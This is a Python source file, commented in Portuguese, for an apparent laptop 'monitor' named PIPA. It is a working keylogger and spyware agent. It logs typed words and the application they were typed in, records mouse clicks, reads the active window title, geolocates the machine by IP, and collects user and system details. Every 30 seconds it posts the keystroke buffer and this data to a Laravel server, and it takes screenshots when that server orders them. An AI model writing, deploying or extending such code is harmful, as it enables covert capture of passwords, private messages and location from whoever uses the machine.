# pipa_monitor_completo.py
import threading
import time
import requests
import json
import base64
import os
import platform
import socket
import io
from datetime import datetime
from PIL import Image, ImageGrab
import cv2
import numpy as np
from pynput import keyboard, mouse
from pynput.mouse import Listener as MouseListener
import re
import psutil
import getpass
import uuid
import subprocess
import sys

class PIPAMonitor:
    def __init__(self, laravel_url, notebook_id):
        self.laravel_url = laravel_url.rstrip('/')
        self.notebook_id = notebook_id
        self.session = requests.Session()
        self.csrf_token = None
        
        # Dados do sistema
        self.dados_sistema = self.capturar_info_completa_sistema()
        self.dados_sistema['notebook_id'] = notebook_id
        self.dados_sistema['status'] = 'ativo'
        
        # Keylogger inteligente
        self.keylogger_buffer = ""
        self.palavra_atual = ""
        self.historico_palavras = []
        
        # Históricos
        self.historico_cliques = []
        
        # Controles
        self.monitorando = True
        self.ultima_atividade = datetime.now()
        self.contador_heartbeat = 0
        
        # Cache de comandos
        self.comandos_executados = set()
        
        # Listeners
        self.keyboard_listener = None
        self.mouse_listener = None
        
        print(f"[PIPA] Monitor iniciado - Notebook {notebook_id}")
        print(f"[PIPA] Enviando dados para: {laravel_url}")

    def obter_localizacao(self):
        """Tenta obter localização aproximada via IP"""
        try:
            # Tenta usar o módulo geocoder se disponível
            try:
                import geocoder
                g = geocoder.ip('me')
                if g.ok:
                    return {
                        'cidade': g.city,
                        'estado': g.state,
                        'pais': g.country,
                        'lat': g.lat,
                        'lng': g.lng,
                        'ip_publico': g.ip,
                        'provedor': 'geocoder',
                        'timestamp': datetime.now().isoformat()
                    }
            except ImportError:
                print("[LOCALIZACAO] ⚠️ Geocoder não disponível, usando API alternativa")
            
            # Fallback para API pública
            response = requests.get('http://ip-api.com/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'success':
                    return {
                        'cidade': data.get('city', 'N/A'),
                        'estado': data.get('regionName', 'N/A'),
                        'pais': data.get('country', 'N/A'),
                        'lat': data.get('lat', 0),
                        'lng': data.get('lon', 0),
                        'ip_publico': data.get('query', 'N/A'),
                        'provedor': data.get('isp', 'N/A'),
                        'provedor': 'ip-api',
                        'timestamp': datetime.now().isoformat()
                    }
                    
        except Exception as e:
            print(f"[LOCALIZACAO] ❌ Erro: {e}")
        
        # Fallback final
        return {
            'cidade': 'Não detectada',
            'estado': 'N/A',
            'pais': 'N/A',
            'ip_publico': self.get_public_ip(),
            'provedor': 'fallback',
            'timestamp': datetime.now().isoformat()
        }

    def get_public_ip(self):
        """Obtém IP público"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Não disponível"

    def obter_aplicativo_ativo(self):
        """Obtém o aplicativo em primeiro plano (Windows)"""
        try:
            if platform.system() == 'Windows':
                import win32gui
                import win32process
                
                hwnd = win32gui.GetForegroundWindow()
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                
                processo = psutil.Process(pid)
                nome_aplicativo = processo.name()
                titulo_janela = win32gui.GetWindowText(hwnd)
                
                return {
                    'pid': pid,
                    'nome_processo': nome_aplicativo,
                    'titulo_janela': titulo_janela,
                    'timestamp': datetime.now().isoformat()
                }
            else:
                return {
                    'nome_processo': 'Sistema não Windows',
                    'titulo_janela': 'N/A',
                    'timestamp': datetime.now().isoformat()
                }
                
        except Exception as e:
            return {
                'nome_processo': 'Desconhecido',
                'titulo_janela': 'Não disponível',
                'timestamp': datetime.now().isoformat()
            }

    def capturar_info_completa_sistema(self):
        """Captura informações completas do sistema com localização"""
        try:
            hostname = platform.node()
            sistema_operacional = f"{platform.system()} {platform.release()}"
            usuario = getpass.getuser()
            ip_address = self.get_ip_address()
            
            # Captura aplicativo atual
            aplicativo_atual = self.obter_aplicativo_ativo()
            
            # Captura localização
            localizacao = self.obter_localizacao()
            
            # Informações de hardware
            memoria = psutil.virtual_memory()
            disco = psutil.disk_usage('/' if platform.system() != 'Windows' else 'C:')
            
            return {
                'hostname': hostname,
                'usuario': usuario,
                'sistema_operacional': sistema_operacional,
                'ip_address': ip_address,
                'aplicativo_atual': aplicativo_atual,
                'localizacao': localizacao,
                'hardware': {
                    'memoria_total': round(memoria.total / (1024**3), 2),
                    'memoria_usada': round(memoria.used / (1024**3), 2),
                    'memoria_percent': memoria.percent,
                    'disco_total': round(disco.total / (1024**3), 2),
                    'disco_usado': round(disco.used / (1024**3), 2),
                    'disco_percent': disco.percent,
                    'cpu_percent': psutil.cpu_percent(interval=1)
                },
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            print(f"[SISTEMA] ❌ Erro: {e}")
            return {
                'hostname': platform.node(),
                'usuario': getpass.getuser(),
                'sistema_operacional': f"{platform.system()} {platform.release()}",
                'ip_address': self.get_ip_address(),
                'localizacao': self.obter_localizacao(),
                'timestamp': datetime.now().isoformat()
            }

    def get_ip_address(self):
        """Obtém endereço IP local"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except:
            return "127.0.0.1"

    def obter_token_csrf(self):
        """Obtém token CSRF do Laravel"""
        try:
            url = f"{self.laravel_url}/api/csrf-token"
            print(f"[CSRF] Obtendo token CSRF...")
            
            response = self.session.get(url)
            
            if response.status_code == 200:
                data = response.json()
                self.csrf_token = data.get('csrf_token')
                print(f"[CSRF] ✅ Token obtido")
                return True
            else:
                print(f"[CSRF] ❌ Erro: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[CSRF] ❌ Erro: {e}")
            return False

    def fazer_requisicao(self, metodo, endpoint, dados=None):
        """Faz requisição com tratamento de CSRF"""
        url = f"{self.laravel_url}/api{endpoint}"
        
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'User-Agent': 'PIPAMonitor/1.0'
        }
        
        if self.csrf_token:
            headers['X-CSRF-TOKEN'] = self.csrf_token
        
        print(f"[REQUISICAO] {metodo} {endpoint}")
        
        try:
            if metodo.upper() == 'POST':
                # Log dos dados (sem mostrar a imagem completa)
                if dados and 'dados' in dados:
                    dados_log = dados.copy()
                    dados_log['dados'] = f"[BASE64_DATA:{len(dados['dados'])}bytes]"
                    print(f"[REQUISICAO] Dados: {json.dumps(dados_log, indent=2)}")
                
                response = self.session.post(
                    url, 
                    json=dados, 
                    headers=headers, 
                    timeout=30
                )
                
                print(f"[REQUISICAO] Status: {response.status_code}")
                
                if response.status_code != 200:
                    print(f"[REQUISICAO] Erro: {response.text[:200]}")
                else:
                    print(f"[REQUISICAO] ✅ Sucesso!")
                    
                return response
                
            elif metodo.upper() == 'GET':
                response = self.session.get(url, headers=headers, timeout=10)
                return response
            else:
                raise ValueError(f"Método {metodo} não suportado")
            
        except requests.exceptions.RequestException as e:
            print(f"[REQUISICAO] ❌ Erro de conexão: {e}")
            return None
        except Exception as e:
            print(f"[REQUISICAO] ❌ Erro inesperado: {e}")
            return None

    def capturar_screenshot_rapido(self):
        """Captura screenshot otimizado"""
        try:
            screenshot = ImageGrab.grab()
            
            # Redimensiona
            largura_original, altura_original = screenshot.size
            nova_largura = 1000
            nova_altura = int((nova_largura / largura_original) * altura_original)
            
            if largura_original > nova_largura:
                screenshot = screenshot.resize((nova_largura, nova_altura), Image.Resampling.LANCZOS)
            
            # Converte para JPEG
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='JPEG', quality=70, optimize=True)
            img_str = base64.b64encode(img_buffer.getvalue()).decode()
            
            tamanho_kb = len(img_str) / 1024
            print(f"[SCREEN] ✅ Capturado - {tamanho_kb:.1f} KB")
            return img_str
            
        except Exception as e:
            print(f"[SCREEN] ❌ Erro: {e}")
            return None

    def processar_palavra(self, palavra):
        """Processa palavra completa do keylogger"""
        if len(palavra) > 2:  # Ignora palavras muito curtas
            app_info = self.obter_aplicativo_ativo()
            aplicativo = app_info.get('nome_processo', 'Desconhecido')
            
            palavra_info = {
                'palavra': palavra,
                'aplicativo': aplicativo,
                'timestamp': datetime.now().isoformat()
            }
            
            self.historico_palavras.append(palavra_info)
            print(f"[PALAVRA] '{palavra}' em {aplicativo}")

    def keylogger_on_press(self, key):
        """Keylogger inteligente - captura palavras completas"""
        try:
            self.ultima_atividade = datetime.now()
            
            if hasattr(key, 'char') and key.char is not None:
                tecla = key.char
                
                # Se for espaço ou enter, finaliza a palavra
                if tecla in [' ', '\n', '\r', '\t']:
                    if self.palavra_atual:
                        self.processar_palavra(self.palavra_atual)
                        self.palavra_atual = ""
                else:
                    self.palavra_atual += tecla
                    self.keylogger_buffer += tecla
                    
            else:
                # Teclas especiais
                tecla = str(key).replace('Key.', '')
                
                # Finaliza palavra com teclas especiais
                if tecla in ['enter', 'tab', 'space'] and self.palavra_atual:
                    self.processar_palavra(self.palavra_atual)
                    self.palavra_atual = ""
                
                # Backspace - remove último caractere
                elif tecla == 'backspace':
                    if self.palavra_atual:
                        self.palavra_atual = self.palavra_atual[:-1]
            
            # Limita buffer
            if len(self.keylogger_buffer) > 5000:
                self.keylogger_buffer = self.keylogger_buffer[-4000:]
                
        except Exception as e:
            print(f"[KEYLOG] ❌ Erro: {e}")

    def mouse_on_click(self, x, y, button, pressed):
        """Captura cliques do mouse"""
        if pressed:
            try:
                self.ultima_atividade = datetime.now()
                
                app_info = self.obter_aplicativo_ativo()
                aplicativo = app_info.get('nome_processo', 'Desconhecido')
                
                clique_info = {
                    'x': x,
                    'y': y,
                    'botao': str(button),
                    'aplicativo': aplicativo,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.historico_cliques.append(clique_info)
                print(f"[MOUSE] Clique em ({x}, {y}) em {aplicativo}")
                
            except Exception as e:
                print(f"[MOUSE] ❌ Erro: {e}")

    def enviar_heartbeat(self):
        """Envia heartbeat com localização"""
        try:
            self.contador_heartbeat += 1
            
            # Atualiza informações a cada 3 heartbeats
            if self.contador_heartbeat % 3 == 0:
                self.dados_sistema.update(self.capturar_info_completa_sistema())
            
            heartbeat_data = {
                'notebook_id': self.notebook_id,
                'status': 'ativo',
                'usuario': self.dados_sistema['usuario'],
                'ip_address': self.dados_sistema['ip_address'],
                'hostname': self.dados_sistema['hostname'],
                'sistema_operacional': self.dados_sistema['sistema_operacional'],
                'info_sistema': self.dados_sistema,
                'keylog_buffer': self.keylogger_buffer,
                'historico_palavras': self.historico_palavras[-50:],  # Últimas 50 palavras
                'historico_cliques': self.historico_cliques[-30:],    # Últimos 30 cliques
                'localizacao': self.dados_sistema.get('localizacao', {}),
                'timestamp': datetime.now().isoformat()
            }
            
            print(f"[HEARTBEAT] ✅ #{self.contador_heartbeat} - Localização: {self.dados_sistema.get('localizacao', {}).get('cidade', 'N/A')}")
            
            response = self.fazer_requisicao('POST', '/notebook/heartbeat', heartbeat_data)
            
            if response and response.status_code == 200:
                print(f"[HEARTBEAT] ✅ Dados enviados com sucesso")
                # Limpa históricos após envio bem-sucedido
                self.historico_palavras = []
                self.historico_cliques = []
            else:
                status = response.status_code if response else 'N/A'
                print(f"[HEARTBEAT] ❌ Falha: {status}")
                
        except Exception as e:
            print(f"[HEARTBEAT] ❌ Erro: {e}")

    def verificar_comandos_servidor(self):
        """Verifica comandos do servidor"""
        try:
            endpoint = f'/notebook/{self.notebook_id}/comandos'
            response = self.fazer_requisicao('GET', endpoint)
            
            if response and response.status_code == 200:
                comandos = response.json()
                print(f"[COMANDOS] 📦 {len(comandos)} comando(s) recebido(s)")
                
                if comandos:
                    # Filtra comandos já executados
                    novos_comandos = []
                    for comando in comandos:
                        comando_id = comando.get('id')
                        if comando_id and comando_id not in self.comandos_executados:
                            novos_comandos.append(comando)
                            self.comandos_executados.add(comando_id)
                    
                    if novos_comandos:
                        print(f"[COMANDOS] ✅ {len(novos_comandos)} novo(s) comando(s)")
                        threading.Thread(
                            target=self.executar_comandos, 
                            args=(novos_comandos,), 
                            daemon=True
                        ).start()
                    
        except Exception as e:
            print(f"[COMANDOS] ❌ Erro: {e}")

    def executar_comandos(self, comandos):
        """Executa comandos recebidos"""
        for comando in comandos:
            acao = comando.get('acao')
            comando_id = comando.get('id')
            
            print(f"[COMANDOS] ⚡ Executando: {acao} (ID: {comando_id})")
            
            inicio = time.time()
            
            if acao == 'screenshot':
                resultado = self.executar_screenshot(comando_id)
            elif acao == 'webcam':
                print(f"[COMANDOS] ⚠️ Webcam temporariamente desativada")
            else:
                print(f"[COMANDOS] ⚠️ Comando desconhecido: {acao}")
                continue
            
            tempo_execucao = time.time() - inicio
            print(f"[COMANDOS] ✅ {acao} concluído em {tempo_execucao:.1f}s")

    def executar_screenshot(self, comando_id):
        """Executa screenshot e envia para servidor"""
        try:
            print(f"[SCREEN] 📸 Iniciando captura...")
            
            screenshot = self.capturar_screenshot_rapido()
            
            if not screenshot:
                print(f"[SCREEN] ❌ Falha na captura")
                return False
            
            payload = {
                'notebook_id': self.notebook_id,
                'tipo': 'screenshot',
                'dados': screenshot,
                'comando_id': comando_id,
                'limpar_anterior': True,
                'timestamp': datetime.now().isoformat()
            }
            
            response = self.fazer_requisicao('POST', '/notebook/midia', payload)
            
            if response is None:
                print(f"[SCREEN] ❌ Nenhuma resposta do servidor")
                return False
                
            if response.status_code == 200:
                print(f"[SCREEN] ✅ Screenshot enviado com sucesso!")
                return True
            else:
                print(f"[SCREEN] ❌ Erro HTTP {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[SCREEN] ❌ Erro: {e}")
            return False

    def heartbeat_loop(self):
        """Loop principal"""
        while self.monitorando:
            try:
                self.enviar_heartbeat()
                self.verificar_comandos_servidor()
            except Exception as e:
                print(f"[LOOP] ❌ Erro: {e}")
            
            time.sleep(30)

    def iniciar_monitoramento(self):
        """Inicia monitoramento"""
        print("[PIPA] 🔄 Iniciando configuração...")
        
        if not self.obter_token_csrf():
            print("[PIPA] ⚠️  Continuando sem CSRF token...")
        
        # Inicia listeners
        try:
            self.keyboard_listener = keyboard.Listener(on_press=self.keylogger_on_press)
            self.keyboard_listener.start()
            
            self.mouse_listener = MouseListener(on_click=self.mouse_on_click)
            self.mouse_listener.start()
            
            print("[LISTENERS] ✅ Keylogger inteligente iniciado")
        except Exception as e:
            print(f"[LISTENERS] ❌ Erro: {e}")
        
        # Inicia heartbeat
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        
        # Mostra informações iniciais
        localizacao = self.dados_sistema.get('localizacao', {})
        print(f"[PIPA] ✅ Monitoramento avançado ativo")
        print(f"[PIPA] 📍 Localização: {localizacao.get('cidade', 'N/A')}, {localizacao.get('estado', 'N/A')}")
        print(f"[PIPA] 🌐 IP Público: {localizacao.get('ip_publico', 'N/A')}")
        print(f"[PIPA] 📡 Aguardando comandos...")
        
        try:
            while self.monitorando:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[PIPA] ⚠️  Encerrando...")
            self.monitorando = False

if __name__ == "__main__":
    LARAVEL_URL = "http://localhost:8000"
    NOTEBOOK_ID = "pipa-notebook-01"
    
    # Verifica dependências
    print("[INICIO] 🔍 Verificando dependências...")
    
    try:
        # Tenta importar geocoder
        try:
            import geocoder
            print("[DEPENDENCIAS] ✅ Geocoder disponível")
        except ImportError:
            print("[DEPENDENCIAS] ⚠️ Geocoder não instalado, usando API alternativa")
            print("[DEPENDENCIAS] 💡 Para melhor precisão: pip install geocoder")
        
        if platform.system() == 'Windows':
            try:
                import win32gui
                import win32process
                print("[DEPENDENCIAS] ✅ Módulos Windows disponíveis")
            except ImportError:
                print("[DEPENDENCIAS] ⚠️ Módulos Windows não instalados")
                print("[DEPENDENCIAS] 💡 Instale: pip install pywin32")
        
    except Exception as e:
        print(f"[DEPENDENCIAS] ❌ Erro: {e}")
    
    # Testa conexão
    try:
        test_url = f"{LARAVEL_URL}/api/test"
        response = requests.get(test_url, timeout=10)
        print(f"[INICIO] ✅ Servidor respondendo - Status: {response.status_code}")
    except Exception as e:
        print(f"[INICIO] ❌ Não foi possível conectar ao servidor: {e}")
        exit(1)
    
    # Inicia o monitor
    monitor = PIPAMonitor(LARAVEL_URL, NOTEBOOK_ID)
    monitor.iniciar_monitoramento()